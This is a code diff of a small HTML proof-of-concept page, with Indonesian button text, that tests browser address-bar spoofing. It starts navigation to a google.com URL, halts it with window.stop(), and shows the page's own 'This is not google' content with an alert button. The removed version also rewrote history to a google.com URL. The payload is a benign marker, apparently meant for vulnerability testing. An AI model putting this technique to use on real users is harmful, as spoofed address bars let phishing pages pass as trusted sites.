@@ -2,41 +2,32 @@
 <html>
 
 <head>
-    <title>Spoofing Test</title>
+    <title>Spoof Test</title>
 </head>
 
-<body style="margin:0; padding:0; text-align:center; font-family:sans-serif; background:white;">
+<body style="background:white; color:black; font-family:sans-serif; text-align:center; padding-top:100px;">
 
-    <div id="my-spoof-content"
-        style="display:none; width:100%; height:100vh; position:fixed; top:0; left:0; background:white; z-index:999; padding-top:100px;">
-        <h1 style="color:red; font-size: 32px;">This is not Google</h1>
-        <p>Lihat Address Bar di atas. Jika berhasil, tulisannya www.google.com</p>
-        <button onclick="alert('Ini alert dari konten spoof lu!')"
-            style="padding:15px 30px; background:#e0e0e0; border:1px solid #ccc; border-radius:4px; cursor:pointer;">Tombol
-            untuk Alert</button>
+    <div id="start">
+        <button id="go" style="padding:10px 20px;" onclick="run()">Jalankan Spoof</button>
     </div>
 
-    <div id="init-btn-container" style="padding-top:150px;">
-        <h2>Test Address Bar Spoofing</h2>
-        <button id="main-btn" onclick="executeSpoof()"
-            style="padding:20px 40px; background:#4285f4; color:white; border:none; border-radius:5px; font-size:18px; cursor:pointer;">Jalankan
-            Spoof Ke Google!</button>
+    <div id="spoofed" style="display:none;">
+        <h1>This is not google</h1>
+        <br>
+        <button onclick="alert('Alert dari konten spoof')">Tombol Alert</button>
     </div>
 
     <script>
-        function executeSpoof() {
-            const btnContainer = document.getElementById('init-btn-container');
-            const spoofContent = document.getElementById('my-spoof-content');
-            const target = "https://www.google.com/favicon.ico";
-            location.href = target;
-            btnContainer.style.display = 'none';
-            spoofContent.style.display = 'block';
+        function run() {
+            document.getElementById('start').style.display = 'none';
+            document.getElementById('spoofed').style.display = 'block';
+            location.href = "https://www.google.com/robots.txt";
             setTimeout(() => {
                 window.stop();
-                history.replaceState(null, null, "https://www.google.com/");
-            }, 10);
+            }, 5);
         }
     </script>
+
 </body>
 
 </html>
